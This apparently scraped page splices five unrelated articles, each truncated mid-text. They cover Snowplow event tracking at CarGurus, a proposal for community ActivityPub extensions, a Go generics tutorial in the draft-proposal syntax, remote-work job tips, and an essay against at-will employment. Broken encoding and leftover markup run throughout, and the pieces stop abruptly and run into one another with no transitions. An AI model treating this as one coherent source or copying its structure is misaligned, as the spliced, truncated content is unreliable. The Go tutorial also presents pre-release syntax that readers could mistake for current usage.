            <figure><img src="https://cdn.spark.app/media/bostata/image/blog_w720.png" alt="blog"></figure><p>Two years ago we set up <strong><a href="https://github.com/snowplow/snowplow/wiki">Open-Source Snowplow</a></strong><strong>Â&nbsp;</strong>at <strong><a href="https://www.cargurus.com/">CarGurus</a></strong><strong>Â&nbsp;</strong>to fulfill a need for self-managed client-side instrumentation. Since that time it has become incredibly impactful for the entire company and has scaled significantly beyond what was originally envisioned. The following is an overview ofÂ&nbsp;<strong>why we set  up the system</strong>,Â&nbsp;<strong>our experience with it,</strong>Â&nbsp;<strong>what we have learned</strong>, andÂ&nbsp;<strong>where we see it continuing to go.</strong></p><p>This post is quite long, so before getting too far into the details....</p><h3>Total events collected: <mark>&gt;268 billion</mark></h3><h3>Data collected: <mark>&gt; 1.5pb (uncompressed)</mark></h3><h3>Event volume: <mark>~ 1 billion events/day</mark></h3><h3>Max Daily Throughput: <mark>~ 15k events/second (sustained during peak hours)</mark></h3><h3><strong>Distinct events: </strong><mark><strong>hundreds and hundreds</strong></mark></h3><h3>Infrastructure upgrade duration: <mark>less than two minutes with zero downtime</mark></h3><h3><strong>Distinct sites with Snowplow tracking: </strong><mark><strong>&gt; 180</strong></mark></h3><p><em>So let's dive in.</em></p><p>We chose Snowplow instead of building our own event tracking system, and plan to stick with it for the foreseeable future. Why? </p><h3><strong>We wanted to independently manage and scale data collection systems.</strong></h3><p>A conversation early in my tenure at CarGurus made a topic abundantly clear: many teams had a strong desire to separate concerns. At that time the company was growing quickly and demands were rapidly changing. Analysts and engineers were joining, onboarding fast, and asking completely new questions of our data. It was all-too-common to tell them their questions simply could not be answered due to the additional load tracking would place on production systems.</p><p>After being personally involved with a couple event-volume-related site outages, it was evident we needed to rethink data collection systems. We needed to be able to scale data collection infrastructure completely separately from application infrastructure, and we needed to significantly isolate the blast radius if something went wrong.</p><p>Snowplow was a strongÂ&nbsp;<span><a href="https://emojipedia.org/check-mark-button/">âœ…</a></span>.</p><h3>We wanted to modernize event collection systems.</h3><p>Another requirement of choosing Snowplow was its ability to quickly and effectively introduce aÂ&nbsp;<strong><a href="http://lambda-architecture.net/">lambda architecture</a></strong><strong>Â&nbsp;</strong>into our analytics stack. As customer needs and demands evolved, we found that having both a real-time, low-latency (on the order of hundreds of milliseconds) component of the event pipeline as well as a batch-based, higher-latency (on the order of minutes) component gave usÂ&nbsp;significantÂ&nbsp;flexibility toÂ&nbsp;proactively fulfill stakeholder asks before they surfaced<em>.</em></p><p>Our pipelines are set up in AWS with <strong><a href="https://aws.amazon.com/kinesis/">Kinesis</a></strong> as transport and <strong><a href="https://www.snowflake.com/">Snowflake</a></strong> as long-term data storage. As stakeholders need real-time access to enriched data, Kinesis is the go-to location. If stakeholders need access to historical event data or want to augment it with other sources in the data warehouse, Snowflake is the place to go.</p><p>Snowplow allowed us to introduce new ideas and methodologies and fulfill both point-in-time and future stakeholder needs.Â&nbsp;<span><a href="https://emojipedia.org/check-mark-button/">âœ…</a></span></p><h3>The world of third-party tracking is rapidly changing and will continue to.</h3><p>As anyone involved in the world of client-side analytics is probably well-aware of, third-party tracking is increasingly going away. Initiatives like <strong><a href="https://blog.chromium.org/2020/01/building-more-private-web-path-towards.html">this</a></strong>Â&nbsp;and <strong><a href="https://webkit.org/tracking-prevention-policy/">this</a></strong><strong>Â&nbsp;</strong>andÂ&nbsp;<strong><a href="https://techcrunch.com/2018/01/23/duckduckgo-adds-tracker-blocking-to-help-curb-the-wider-surveillance-web/">this</a></strong><strong>Â&nbsp;</strong>are fantastic for online privacy (and commendable), but have major implications for tracking and analytics. With an eye towards the future we knew we needed to decrease reliance on Google Analytics, Adobe, Heap, and all other similar third-party tracking systems if we wanted full insight into web traffic. We wanted 100% of site behavior instead of sampled GA or ad-blocked Adobe. And we wanted to own the resulting data.</p><p>Snowplow enabled us to track first-party web activity and regain full visibility into usage behavior on our site.Â&nbsp;<span><a href="https://emojipedia.org/check-mark-button/">âœ…</a></span></p><h3>Snowplow sets a high bar for fault-tolerance, redundancy, and durability.</h3><p>When set up properly, the Snowplow infrastructure isÂ&nbsp;extremelyÂ&nbsp;fault-tolerant. We set up ours in AWS and have not regretted it whatsoever.</p><p>Javascript tracking code buffers unsent events locally in the case of collection infrastructure being down. AWS application load balancers are multi-AZ and AWS maintains a good SLA for them. All access logs are retained for a period of time in case the load balancer is up but the rest of the system is down. Kinesis replicates data across three AZ's by default, and retention can be configured up to 168 hours in the case of mid-pipeline enrichment outages. S3 is highly durable and highly available by default. And the list goes on....</p><h3>We wanted to own all data that was generated.</h3><p>As mentioned above, if we were going to invest time and money building scalable event-collection infrastructure, <em>we simply</em>Â&nbsp;<em>had to own the outcome.</em>Â&nbsp;It is a significant investment to get large-scale infrastructure and instrumentation off the ground, and it's hard to do tracking in a way that doesn't impose a burden on analysts down the road (think <a href="https://developers.google.com/analytics/devguides/collection/analyticsjs/events">Google Analytics events</a>).</p><p>We didn't want to deal with API rate limiting when attempting to recover our data. We didn't want to be tied to BigQuery, and we didn't want our customers' data flowing through other companies' systems.</p><h3>We needed to keep data quality high.</h3><p>When building out data collection and processing systems, it's one thing to set up infrastructure. It's a completely different story to keep quality high as priorities, teams, and customer demands shift. It's even harder to impose more work in an attempt to keep data "clean".</p><p>The way snowplow handles event validation and stream-redirection was a perfect fit in our case. After setting the system up we quickly found that leveraging <a href="https://github.com/snowplow/snowplow/wiki/2-Specific-event-tracking-with-the-Javascript-tracker#trackSelfDescribingEvent">Self-Describing Events</a>Â&nbsp;and the associated <a href="https://json-schema.org/">jsonschemas</a> empowered us to enforce data quality in a very low-friction way. Whenever events start flowing (with a bad push, etc) that don't adhere to the implementing party's jsonschema, they are redirected out of the "good" path for immediate review and recovery. Self-describing events (and jsonschemas) also gave us the ability to do some pretty neat automation, which will be covered later.</p><h3>The world of compliance is changing rapidly and we needed the ability to audit every piece of information.</h3><p>Since we first set up Snowplow the world has been forced to navigate two big data-privacy hurdles: <a href="https://gdpr-info.eu/">GDPR</a> and <a href="https://oag.ca.gov/privacy/ccpa">CCPA</a>. Since we own and operate all collection infrastructure we did not need to get a third-party vendor DPA. Snowplow gives a significant amount of flexibility for enriching and redirecting PII, as well as configurable pseudonymization. It's good, it "just works", and it has saved us a considerable amount of time.</p><p>We've also spent a significant amount of time persisting full system lineage when splitting events into Snowflake which makes it easy to fully adhere to privacy legislation and associated requirements.</p><h3>We wanted to build, guide, and get out of the way.</h3><p>My favorite part about programming and tech isÂ&nbsp;building (machine) processes, cultivating good (human) habits, and getting out of the way. An early challenge was maintainingÂ&nbsp;clear, consistent definitions of data between frontend engineers (the implementer of tracking) and analysts (the stakeholders of said tracking). Event data was previously tracked, flowed through a number of different systems, and was often renamed (sometimes several times) when it finally landed in Snowflake.. Snowplow's self-describing events have allowed us to shift many conversations away from data pipeline engineers and back to where they should be taking place. I was able to back away since stakeholders and implementers were able to approach important conversations from a point of shared, consistent understanding.</p><h3>Last but not least, we needed to hit the ground running.</h3><p>While we may have had time to build out our own system from scratch, why build when you can lean on the backs of giants? The community of people contributing to Snowplow has grown significantly since the first time I implemented it, and people all over the world have run into almost every challenge imaginable. As fun as it would have been to deconstruct the system and build and implement our own,Â&nbsp;<em>it simply wasn't worth it.Â&nbsp;</em>Our stakeholders had questions that they wanted answered "yesterday" and their needs were our priority #1.</p><p>Snowplow enabled us to hit the ground running and answer real business questions "now".Â&nbsp;<span><a href="https://emojipedia.org/check-mark-button/">âœ…</a></span></p><h2>Phase 1: Keep It Simple. Get It Running. Prove the System's Worth.</h2><p>When Snowplow was first rolled out there was a single mission in mind:Â&nbsp;<em>make sure it was a good organizational fit.Â&nbsp;</em>We had systems in place with some functional overlap already, so we had to make sure we weren't introducing a new system simply........ for the sake of introducing a new system. Or staking claim in others' territory. The system had to work. It had to answer questions that had been previously-unanswerable. It had to be robust. And it had to solve real-life challenges.</p><h3>We very consciously chose to<strong><em>:</em></strong></h3><p><strong>Automate all infrastructure.</strong> We wanted to scale, upgrade, and roll out entirely new sets of infrastructure fast. Everything was <a href="https://www.terraform.io/">Terraformed</a>Â&nbsp;and infrastructure was 100% immutable.</p><p><strong>Keep it simple.</strong> We could have gone straight to k8s or autoscaling clusters or ecs or eks or any other new (admittedly attractive) thing. But we didn't. We wanted to see how the system itself would perform and scale.</p><p><strong>Focus on the stakeholder.Â&nbsp;</strong>The only way this initiative was going to work was if others felt ownership of it, it decreased their pain, it empowered them to do their jobs better, or a combination of all. Instead of focusing on a hip/cool/hot/new systemÂ&nbsp;<em>we focused on answering the questions at hand.</em></p><h3>We initially choseÂ&nbsp;<strong>not to</strong><strong><em>:</em></strong></h3><p><strong>Pile on infrastructure complexity or over-optimize.</strong>Â&nbsp;We wanted to see how the system performed at scale when viewed under a magnifying lens. Since the best way to put a system through its paces is by minimizing complexity and other overhead, that's what we did. We wanted to know what goes wrong and potential system bottlenecks.</p><p><strong>Implement a widespread mandate.Â&nbsp;</strong>I strongly believe the most effective way to approach important conversations is with real-life (not theoretical) …</p></article></div>

<p>This is going to be a look at my philosophy and views on ActivityPub and why I believe the solutions to ActivityPub criticisms must come from communities. I believe there needs to be a clear way for communities to form and build upon the ActivityPub specification. The public needs to do so while keeping the cost to participate as close to zero as possible. At the end, I will present a concrete solution of extending ActivityPub to help organize its own extensions.</p>

<p>I’m going to assume that the reader is familiar with the ActivityPub protocol or at least familiar enough such that I don’t need to give background information.</p>

<h2>Background: Go-fed and I</h2>

<p>I don’t expect folks to know me. On Mastodon I am <a href="https://mastodon.technology/@cj">@cj@mastodon.technology</a>. I have been working on an ActivityPub library implementation in golang [<a href="https://go-fed.org/">go-fed</a>] for a little over a year. I started back in late November or early December of 2017, just before the ActivityPub spec matured. Due to the complicated technical solution required, it took me quite a long time to have a first release. It’s taken me another six or eight months to work toward the next major release of go-fed. Also, building a library means I don’t have direct end-users like other projects have. Honestly, I don’t mind. It has allowed me to think much more about general development practices around ActivityPub since my direct users are other software developers.</p>

<p>So please consider this post a year in the making.</p>

<h2>The Incomplete Philosophy &amp; Fediverse of Flavors</h2>

<p>I want to give an overview of a philosophy that I’ve adopted while working on ActivityPub. Succinctly: I view ActivityPub as a transport protocol that alone is not sufficient to build an application.</p>

<p>It’s not meant to dictate what an application is, nor its domain’s behaviors, nor its domain’s side effects. There are two kinds of federating: transmitting data and dictating peer app behavior. ActivityPub is a minimalistic protocol governing the sharing of information and the most sparse set of side effects in order to allow federation (transmission) between peers. It doesn’t dictate federation (app behavior) between peers for all domains. Anything more than just sending and receiving information needs to be built on top of ActivityPub as an extension.</p>

<p>ActivityPub alone is not a specification that solves all domain behaviors.</p>

<p>It has taken me a long time to realize this. ActivityPub doesn’t make it easy to adopt this philosophy because it also happens to contain its own “ActivityPub extension” specifically for the social media domain. This is why social media applications have adopted ActivityPub – the “ActivityPub extension” for the social media domain is itself embedded and hidden within the original ActivityPub specification. The ActivityPub specification handles both kinds of federating (transmission and app behavior) for the social media domain to a certain degree.</p>

<p>On the other hand, a code forge application would use ActivityPub to guarantee it can physically transmit and receive data federatively. But the ActivityPub specification alone is insufficient at dictating what other code forge applications may or may not do with the data. That requires building an ActivityPub extension by the code forge community. I think this is a fundamental issue that some folks have with ActivityPub. It does not dictate to peers what it may or may not do with the data they receive and the expectations around handling such data for other domains.</p>

<p>When looking at ActivityPub as an incomplete specification, there are some neat consequences. I have a cheesy metaphor for it. Building on ActivityPub allows creating different “flavors” of Fediverse: a social media one, an economic one, a code forge one, an educational one, and so on. Despite all the different flavors of Fediverse, they are all still a part of the same network. Developers may have their apps freely pick and choose which flavors of Fediverse to use to build the user experience they want from a single-flavor microblog to a multi-flavor code-forge-managed-by-an-economic-co-op. These “flavors” are simply different domains.</p>

<p>Also, each developer’s application doesn’t have to develop their own standard. They could, but I think it’s more preferable that each domain of the Fediverse builds one or more independent communities to standardize their specific solutions through the use of ActivityStreams extensions. Concretely, all that needs to be done is to define new ActivityStreams types and properties, as well as new expected behaviors when handling these types and properties. This is similar to Sections 6 and 7 of the ActivityPub specification. From there, developers would look only at the flavors they cared about and pick those additional behaviors to implement.</p>

<p>Unfortunately, when the ActivityPub protocol was published there was neither guidance nor support on how to build these communities, how to develop more specialized domains, or how to organize more rigorous behaviors around the data being shared. And there still isn’t.</p>

<p>If this mindset seems alien or the philosophy is hard to take seriously, let’s step back and reframe ourselves. ActivityStreams comes as a form of RDF data known as JSON-LD. In contrast to the modern web which uses HTTP to serve and share hypertext documents linked together by hyperlinks, ActivityPub uses HTTP to serve and share structured-data JSON documents linked by IRIs. REST follows this model closely, so none of this is surprising. However, ActivityPub takes it one step further by specifying a way to transmit this data without having to build (or code generate) custom REST client endpoints. This is a key differentiator, but at a cost.</p>

<p>The cost is that developers who are used to an application-specific mindset struggle with viewing ActivityPub as a purposefully incomplete specification since it doesn’t specify federating (app behavior) in all domains. This is exacerbated by ActivityPub being touted as a complete specification. When comparing against application-specific REST APIs that are concrete, it makes sense that forcing ActivityPub upon this community is bound to generate criticisms along the vein of “it’s underspecified,” “it’s ambiguous,” and “look how I can write a broken compliant application.”</p>

<p>While I tend to view those particular kinds of criticisms as simply stemming from a philosophical difference, there are a lot of remaining criticisms I agree with. Issues such as security, discoverability, or lacking certain social media features. I really do think the next steps involve building the community of developers and interested non-technical folks in such a way that allows for multiple independent specifications to build off of ActivityPub.</p>

<h2>The Future: Addressing Criticisms &amp; Expanding Domains</h2>

<p>I don’t expect people to buy into my mindset or philosophy on what ActivityPub is and what those next steps should be. At minimum, I hope folks that reject it at least appreciate where I am coming from. I know it’s very easy to discuss general principles and philosophies, so now I would like to offer my own personal fantasy, in concrete terms, of what could be in store for the future. To do so, I need to identify the problems it is solving.</p>

<p>The first problem is getting different ActivityPub communities to self-organize to solve their own domain problems, build their own specifications on top of ActivityPub, and hold each other accountable at sticking to those specifications rigorously. A second problem is discoverability of these specifications for fellow developers without having a centralized organization hosting a registry or dictating a process. The cost of extending ActivityPub should always remain as close to zero as possible for numerous philosophical and moral reasons that I don’t want to get into here.</p>

<p>Note that there is some prior art. ForgeFed has solved the first problem by hosting a repository on GitHub and having a mailing list at Framasoft. They organized their own process and collaborated to build and create several proposals. So there is some evidence that existing tools can be sufficient for solving the self-organizing problem. However, it does not solve the second problem of getting would-be ActivityPub developers to discover these extensions.</p>

<p>My simple proposed fantasy is: Why not build on top of ActivityPub to solve both of these problems?</p>

<p>First, we as a community create an ActivityStreams extension and define behaviors to document the specifications built on top of ActivityPub. We now have a way to store ActivityPub extension specifications in the Fediverse itself. Next, building an application server that understands this extension and can federate it over ActivityPub means anyone can simply host an instance, allow users to register, build its community, and be free to draft new specifications on top of ActivityPub. Since this data is then federated by ActivityPub itself, it is reachable by both technical and non-technical users. There is neither a central authority nor a central registry as each community is responsible for its own ActivityPub specifications. This is the democratization of ActivityPub across all domains. People cannot have their ActivityPub extension specification censored. As long as the core ActivityPub protocol as currently written is followed, federation compatibility naturally leads to new domains and apps implementing them.</p>

<p>As hosts of these specs, we would all have to be good citizens and not purposefully and maliciously create specifications that collide namespaces or repurpose existing semantics from other specs in ways that are incompatible. Instances and specific specs may become blacklisted if obviously malicious. My fantasy solution does not solve these human problems, but it is not meant to. It’s meant to help facilitate human interactions. I concede this proposal will make protocol purists uncomfortable with the idea of bringing humanity so close to the heart of a technical process. I know some folks …</p></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="44" id="block-yui_3_17_2_1_1593278017230_21391"><div><p>Generics what now? This friendly, down-to-earth tutorial explains what generic functions and types are, why we need them, how they work in Go, and where we can use them. It's easy and fun, so let's dance!</p>
<p>(<em data-preserve-html-node="true">Note:The support for generics in Go that I describe here isn't yet released, and the <a href="https://go.googlesource.com/proposal/+/refs/heads/master/design/go2draft-type-parameters.md">proposal for how it would work</a> is under active development. Right now you can play with it in the <a href="https://go2goplay.golang.org/">generics-enabled version of the Go Playground</a>, or you can use the experimental <a href="https://go.googlesource.com/go/+/refs/heads/dev.go2go/README.go2go.md">go2go tool</a> to try Go's generics support in your own programs.</em>)</p>
<h2 id="what-are-generics-">What are generics?</h2>
<p>As you know, Go is a <em>typed</em> language, meaning that every variable and value in your program has some specific type, like <code>int</code> or <code>string</code>. When we write functions, we need to specify the type of their parameters in what's called the <em>function signature</em>, like this:</p>
<pre><code>func PrintString(s string) {</code></pre>
<p>Here, the parameter <code>s</code> is of type <code>string</code>. We can imagine writing similar versions of this function which take an <code>int</code>, a <code>float64</code>, an arbitrary struct type, and so on. But that would be inconvenient for more than a handful of specific types, and though we can sometimes use <em>interfaces</em> to solve this problem (as described in the <a href="https://bitfieldconsulting.com/golang/map-string-interface"><code>map[string]interface</code> tutorial</a>, for example), that approach has many limitations.</p>
<h2 id="generic-functions-in-go">Generic functions in Go</h2>
<p>Instead, we would like to declare a <em>generic function</em> <code>PrintAnything</code>, which takes an argument of an arbitrary type T, and does something with it.</p>
<p>Here's what that looks like:</p>
<pre><code>func PrintAnything(type T)(thing T) {</code></pre>
<p>Simple, right? How do we call it? Equally simply:</p>
<pre><code>PrintAnything("Hello!")</code></pre>
<p>In the rare cases where Go can't guess what type T is based on the value we pass to the function, we can make it explicit:</p>
<pre><code>PrintAnything(int)(99)</code></pre>
<h2 id="constraints">Constraints</h2>
<p>It's pretty easy to implement the <code>PrintAnything</code> function, because the <code>fmt</code> library can print anything anyway. Suppose we wanted to write our own version of something like <code>strings.Join</code>, which takes a slice of T, and returns a single string that joins them all together. Let's try:</p>
<pre><code>// I have a bad feeling about this.
func Join(type T)(things []T) (result string) {
    for _, v := range things {
        result += v.String()
    }
    return result
}</code></pre>
<p>We've created a generic function <code>Join()</code> which takes, for an arbitrary type T, a parameter which is a slice of T. Great, but now we run into a problem:</p>
<pre><code>output := Join([]string{"a", "b", "c"})
// v.String undefined (type bound for T has no method String)</code></pre><p>Thing is, inside the <code>Join()</code> function, we want to call <code>.String()</code> on each slice element <code>v</code> to turn it into a string. But Go needs to be able to check in advance that type T has a <code>String()</code> method, and since it doesn't know what T is, it can't do that!</p>
<p>What we need to do is <em>constrain</em> the type T slightly. Instead of accepting literally any type, we're really only interested in types which have a <code>String()</code> method. Any such type will be an acceptable input to our <code>Join()</code> function, so how do we express that constraint in Go? We use an <em>interface</em>:</p>
<pre><code>type Stringer interface {
    String() string
}</code></pre>
<p>This specifies that a given type has a <code>String()</code> method. So now we can apply this constraint to the type of our generic function:</p>
<pre><code>func Join(type T Stringer) ...</code></pre>
<p>Since <code>Stringer</code> guarantees that any value of type T will have a <code>String()</code> method, Go will now happily let us call it inside the function. But if you try to call the <code>Join()</code> function with a slice of some type that <em>doesn't</em> satisfy <code>Stringer</code> (for example <code>int</code>), Go will complain:</p>
<pre><code>result := Join([]int{1, 2, 3})
// int does not satisfy Stringer (missing method String)</code></pre><h2 id="the-comparable-constraint">The <code>comparable</code> constraint</h2>
<p>Constraints based on method sets, like <code>Stringer</code>, are useful, but what if we want to do something with our generic input that doesn't involve calling a method?</p>
<p>For example, suppose we want to write an <code>Equal</code> function which takes two parameters of type T, and return <code>true</code> if they are equal, or <code>false</code> otherwise. Let's have a go:</p>
<pre><code>// This won't work.
func Equal(type T)(a, b T) bool {
    return a == b
}

fmt.Println(Equal(1, 1))
// cannot compare a == b (operator == not defined for T)</code></pre>
<p>This is the same kind of issue as we had in <code>Join()</code> with the <code>String()</code> method, but since we're not <em>calling</em> a method now, we can't use a constraint based on a method set. Instead, we need to constrain T to only types that work with the <code>==</code> or <code>!=</code> operators, which are known as <em>comparable</em> types. Fortunately there's a straightforward way to specify this: use the built-in <code>comparable</code> constraint.</p>
<pre><code>func Equal(type T comparable) ...</code></pre>
<h2 id="the-constraints-package">The <code>constraints</code> package</h2>
<p>Just to be difficult, suppose we want to do something with values of T which isn't either comparing them or calling methods on them. For example, suppose we want to write a <code>Max()</code> function for a generic type T which takes a slice of T and returns the element with the highest value. We might try something like this:</p>
<pre><code>// Nope.
func Max(type T)(input []T) (max T) {
    for _, v := range input {
        if v &gt; max {
            max = v
        }
    }
    return max
}</code></pre>
<p>I'm not feeling very optimistic about this, but let's see what happens:</p>
<pre><code>fmt.Println(Max([]int{1, 2, 3}))
// cannot compare v &gt; max (operator &gt; not defined for T)</code></pre>
<p>Again, Go can't prove ahead of time that the type T will work with the <code>&gt;</code> operator (that is to say, that T is <em>ordered</em>). How can we fix this? We could simply list every possible allowed type in a constraint, like this (known as a <em>type list</em>):</p>
<pre><code>type Ordered interface {
    type int, int8, int16, int32, int64,
        uint, uint8, uint16, uint32, uint64, uintptr,
        float32, float64,
        string
}</code></pre>
<p>Fortunately for your keyboard, this and other useful constraints are already defined for us in the standard library's <code>constraints</code> package, so we can import that and use it like this:</p>
<pre><code>func Max(type T constraints.Ordered) ...</code></pre>
<p>Problem solved!</p>
<h2 id="generic-types">Generic types</h2>
<p>So far, so cool. We know how to write functions that can take arguments of any type. But what if we want to create a <em>type</em> that can contain any type? For example, a 'slice of anything' type. That turns out to be very easy:</p>
<pre><code>type Bunch(type T) []T</code></pre>
<p>We're saying that for a given type T, a <code>Bunch(T)</code> is a slice of values of type T. For example, a <code>Bunch(int)</code> is a slice of <code>int</code>. We can create values of that type in the normal way:</p>
<pre><code>x := Bunch(int){1, 2, 3}</code></pre>
<p>Just as you'd expect, we can write generic functions which take generic types:</p>
<pre><code>func PrintBunch(type T)(b Bunch(T)) {</code></pre>
<p>Methods, too:</p>
<pre><code>func (b Bunch(T)) Print() {</code></pre>
<p>We can also apply constraints to generic types:</p>
<pre><code>type StringableBunch(type T Stringer) []T</code></pre>
<h2 id="golang-generics-playground">Golang generics playground</h2>
<p>So that you can play with the current implementation of the generics proposal (for example to try the code samples in this tutorial), the Go team have provided a generics-enabled version of the Go Playground here:</p>
<p><a href="https://go2goplay.golang.org/">Golang generics playground</a></p>
<p>It works exactly the same way as the normal <a href="https://play.golang.org/">Go playground</a> we know and love, except that it supports the generic syntax described here. Because it's not possible to run all Go code in the playground (for example, code that makes network calls or accesses the filesystem), you can also try out the <a href="https://go.googlesource.com/go/+/refs/heads/dev.go2go/README.go2go.md">go2go tool</a>, which translates code using generics to code which compiles with the current version of Go.</p>
<h2 id="questions">Questions</h2>
<h3 id="will-golang-get-generics-">Will Golang get generics?</h3>
<p>Almost certainly yes. The current proposal for generics support in Go, as outlined in this tutorial, was announced in June 2020 in a blog post: <a href="https://blog.golang.org/generics-next-step">The Next Step for Generics</a>, and is being evaluated by the community. Since Go's lack of generics has often been cited as holding back the more widespread adoption of Go, the reaction has been generally positive.</p>
<p>The Golang generics roadmap currently specifies a possible release date as early as Go version 1.17, which would be in August 2021 (but it may not be as soon as that, depending on how much the current proposal evolves based on feedback).</p>
<p>Until then you can use the <a href="https://go2goplay.golang.org/">Generics Playground</a> to experiment with it and try out the examples here.</p>
<h3 id="generics-vs-interfaces-are-there-alternatives-to-generics-">Generics vs interfaces: are there alternatives to generics?</h3>
<p>As I mentioned in my <a href="https://bitfieldconsulting.com/golang/map-string-interface"><code>map[string]interface</code> tutorial</a>, we can already write Go code that handles values of any type, without using generic functions or types, by means of <em>interfaces</em>. However, if you want to write a library that implements things like collections of arbitrary types, using a generic type is much simpler and more convenient than using an interface.</p>
<h3 id="can-i-use-code-generation-instead-of-generics-">Can I use code generation instead of generics?</h3>
<p>The 'code generator' approach has been the other traditional way of dealing with such problems before the advent of generics in Go. Essentially, it involves using the <a href="https://blog.golang.org/generate"><code>go generate</code> tool</a> to produce Go code for each of the specific types that you need to handle in your library.</p>
<p>While this works, it's awkward to use, limited in its flexibility, and requires an extra build step. While code generation is still useful for some things, it's nice that we no longer have to use it to simulate generic functions and types in Go.</p>
<h3 id="what-are-contracts-">What are contracts?</h3>
<p>An earlier <a href="https://go.googlesource.com/proposal/+/master/design/go2draft-contracts.md">draft design</a> for generics in Go used a similar syntax to what we have today, but it implemented type constraints using a new keyword <code>contract</code>, instead of the existing <code>interface</code>. This was not popular for various reasons, and is now superseded.</p>

      <p>Not many people called it, but a weird upside to the Coronavirus "New Normal" is that companies that are fiercely against working from home have now been forced to let their staff do it because of health laws, or staff refusal to come in and risk catching the virus.</p>
<p>Many tech workers have been enjoying this perk, and possibly thinking to themselves "can I work like this forever?". I believe the answer is yes, but for most, it won't be for zero effort. When the pandemic is over, old ways of thinking might creep back in.</p>
<p>With a bit of thought on your part, now is the best time ever to transition to remote work, so that you can travel more, commute less, spend less on rent and spend more time with your family and mates.</p>
<p>Here are some tips for doing just that:</p>
<h2 id="1-look-out-for-remote-first-companies">1. Look out for remote-first companies.</h2>
<p>Remote first companies such as <a href="https://about.gitlab.com/">Gitlab</a>, are set up so that all employees work remotely, from anywhere in the world. As such they are almost certainly never going to transition you to an office (because they don't have any!) or look down on you as one of "those remote employees". </p>
<p>They are also more likely to have the tools and processes set up the make remote work smooth because everyone has to do it. They probably have a smoother developer onboarding process than "get Bob to come over and help you install everything", and have ironed over kinks to do with standups, meetings and agile ceremonies to adjust for the challenges of not being in the same physical room.</p>
<h2 id="2-market-yourself-as-an-experienced-remote-employee">2. Market yourself as an experienced remote employee.</h2>
<p>With the Coronavirus pandemic now an almost permanent fixture in our lives, I think most of us now have real remote-working experience. Use this to present yourself as remote-ready. In your CV or cover letter, you can emphasise this. </p>
<p>For the interview prepare: How will you explain how you are great at remote work? What challenges have you overcome? How do you stay motivated and productive when working from home? If you are a team leader, what initiatives have you put in place to help make remote working more effective? How do you ensure that your team members are doing great work and not getting stuck?</p>
<p>Show them that you can be trusted and that you communicate well and are easy to manage, and if applicable, can manage others well.</p>
<h2 id="3-move-into-a-more-permanent-remote-relationship-with-your-current-company">3. Move into a more permanent remote relationship with your current company.</h2>
<p>The current working situations would have proved that yes, you can have a team working remotely, regardless of your company size. If your company has done it they will have this first-hand experience. If not you can point to myriad other examples such as Facebook, Amazon, Slack and Twitter who have let their employees work from home unless they have to be in the office for their specific job duties.</p>
<p>This is the time to negotiate what you want in terms of working from home, be it part-time WFH or full time. If you love where you work this is probably a better option than leaving. If you decide to move to another company in the future you can use point #2 with more force - marketing yourself as an experienced remote worker.</p>
<h2 id="4-market-yourself-through-open-source-contributions">4. Market yourself through open source contributions.</h2>
<p>Open-source contributions, to strategically chosen projects, will not only show you can code but help you build relationships with people working at remote-first or heavily remote-oriented companies. It might get you a foot in the door or even bypass early interviews. You don't need to build an entire project and be a <a href="https://en.wikipedia.org/wiki/Benevolent_dictator_for_life">"BDFL"</a> of a major framework. Just find a good project in a programming language you are familiar with, and start fixing bugs. Be respectful of the rules, protocol and culture of that project so as not to annoy the maintainers, but make them enjoy working with you.</p>

While criticizing the government, or even waving the wrong flag, <a href="https://www.bbc.com/news/world-asia-china-53244862">could get you imprisoned</a> in any territory under Chinese rule, your right to freedom of expression is sacrosanct under the First Amendment—until you step into your place of work, that is. While the government is not entitled to punish political dissent, in most parts of America it is perfectly legal for your boss to fire you if they happen to dislike the person you voted for in the last election. </p><div><p>This restriction on political expression is especially harmful at a time when, nearly every day, somebody is accused of having transgressed against some commonly (or even not so commonly) held taboo. In many of these cases, employees—from senior staff at prominent institutions to working-class laborers—have been fired. Even outside of working hours, it would now be perfectly reasonable for most Americans to think twice before speaking their minds about hot-button issues.</p><p> In their attempts to remedy the most pernicious aspects of cancel culture, critics have mostly concentrated on advocating less punitive social norms. This is good as far as it goes. Our political culture will only become more liberal if we all stop demanding that people be punished or fired for imaginary transgressions. Yet, this emphasis on culture ignores the important role that legislative reform could play in defending the most vulnerable: If it were harder for employers to fire people for frivolous reasons, Americans would have less reason to fear that expressing their views might cost them their livelihoods.</p></div><p><strong>The Problem with At-Will Employment</strong></p><p>At the moment, most American workers are subject to “at-will” contracts. As long as their employers do not fire them on the basis of a narrow set of protected characteristics, such as gender, race, and sexual orientation, they can lose their jobs at any time, for any reason. Nor is there a due process requirement: Companies are under no legal obligation to investigate whether the ostensible reasons for axing an employee are grounded in reality. (The only state that categorically prohibits at-will employment, after six months on the job, <a href="https://spoonlaw.com/437-2/">is Montana</a>). </p><div><p> The prevalence of at-will employment makes it easier for employers to engage in knee-jerk reactions to short-lived social media controversies. For instance, a Hispanic electrician working for the San Diego Gas and Electric company was fired for cracking his knuckles in a photograph because a <a href="https://www.nbcsandiego.com/news/local/sdge-worker-fired-over-alleged-racist-gesture-says-he-was-cracking-knuckles/2347414/">social media mob believed that he was</a> flashing a white power sign. The man who took the picture has since admitted that he probably misinterpreted the interaction, and thousands of people have now <a href="https://www.change.org/p/sdge-reinstate-emmanuel-caffertys-job-sdge">signed a petition</a>, asking the electrician’s former employer to reverse the mistake. But since the employee has already lost his job, it will be hard for him to obtain justice. As in many other cases, both parties would have been better off if the law had required the company to afford due process to an accused worker <em>before</em> deciding whether or not to fire him. </p><p> There is a better alternative: Contracts negotiated by labor unions often provide so-called “just cause” protections for employees. The tests of just cause <a href="https://www.massnurses.org/labor-action/labor-education-resources/grievances-101/just-cause#:~:text=Just%20cause%20is%20the%20standard,must%20be%20just%20and%20fair.&amp;text=The%20concept%20of%20just%20cause%20is%20well%20established%20in%20labor%20law.">typically include questions</a> such as whether the employee was forewarned of the consequences of his or her actions, whether the rules were applied evenly, and whether there was an objective investigation into the employee’s conduct. In other words, it forces employers to conduct a fair process before firing their employees, which gives the accused a real chance to defend themselves. If we really care about free speech and due process, these protections should be available to every American.</p></div><div><p>Opponents of these reforms have long argued that they would come at a heavy cost to the economy. But scholars who have studied the impact of wrongful discharge protections have obtained mixed results. <a href="https://www.nber.org/papers/w12860.pdf">One 2007 study of U.S. employers</a>, for example, found that the introduction of such protections resulted in some loss of productivity, but also led to strong growth in overall employment numbers.</p></div><p><strong>Stop Employers From Discriminating Against Views They Don’t Like</strong></p><p> Just cause legislation would help to reduce the number of capricious firings. But, as long as bosses can legally terminate employees 